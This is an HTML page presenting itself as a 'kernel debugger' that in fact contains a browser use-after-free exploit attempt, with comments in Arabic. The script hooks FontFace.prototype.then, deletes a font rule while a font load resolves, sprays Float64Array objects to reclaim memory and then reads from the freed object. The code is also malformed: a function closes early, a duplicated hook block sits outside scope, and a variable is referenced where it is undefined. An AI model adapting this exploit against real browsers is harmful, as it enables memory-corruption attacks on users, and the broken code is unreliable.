<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
        #console { border: 1px solid #333; padding: 10px; height: 400px; overflow-y: scroll; background: #0a0a0a; }
        .log { margin-bottom: 5px; }
    </style>
</head>
<body>
    <h3>JANUS_KERNEL_DEBUGGER v1.1 - [Partition Breaker]</h3>
    <div id="console"></div>

    <script>
        const log = (msg) => {
            const consoleDiv = document.getElementById('console');
            consoleDiv.innerHTML += `<div class="log">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        };

        window.onload = () => {
    // 1. تثبيت الـ Hook أولاً (يجب أن يكون قبل أي محاولة تحميل)
    let A = new FontFace('nonExistentFont_999', 'url(https://invalid-url.local)', { unicodeRange: 'U+0041' });
    
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (this === A) {
                log("[!] HOOK_TRIGGERED: FontFace Promise Resolution intercepted...");
                document.getElementById('s').sheet.deleteRule(0);
                // هنا يبدأ الـ Spraying
                return undefined;
            }
            return undefined;
        }
    });

    document.fonts.add(A);
    log("[+] FORCING_FONT_LOAD_PENDING...");
    document.fonts.load('1em nonExistentFont_999', 'AB');
};


            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    if (this === A) {
                        log("<span style='color: yellow;'>[!] TRIGGER: Deleting FontRule...</span>");
                        document.getElementById('s').sheet.deleteRule(0);
                        
                        log("[+] SPRAYING_JSC_OBJECTS (Float64Array)...");
                        let spray = [];
                        for (let i = 0; i < 500; i++) {
                            // تخصيص ذاكرة داخل مسبح الـ JSC
                            let arr = new Float64Array(32); 
                            arr[0] = 1.1; // بصمة رقمية للتداخل
                            spray.push(arr);
                        }

                        setTimeout(() => {
                            try {
                                log("[?] ATTEMPTING_DEREFERENCE...");
                                // محاولة القراءة من الكائن المحرر
                                let val = A.family; 
                                log("[SUCCESS] READ: " + val);
                            } catch(e) {
                                log("<span style='color: red;'>[CRITICAL] READ_FAILURE: " + e.message + "</span>");
                            }
                        }, 50);
                    }
                    return undefined;
                }
            });
            document.fonts.load('1em targetFont', 'AB');
        };
    </script>
    <style id="s">@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }</style>
</body>
</html>
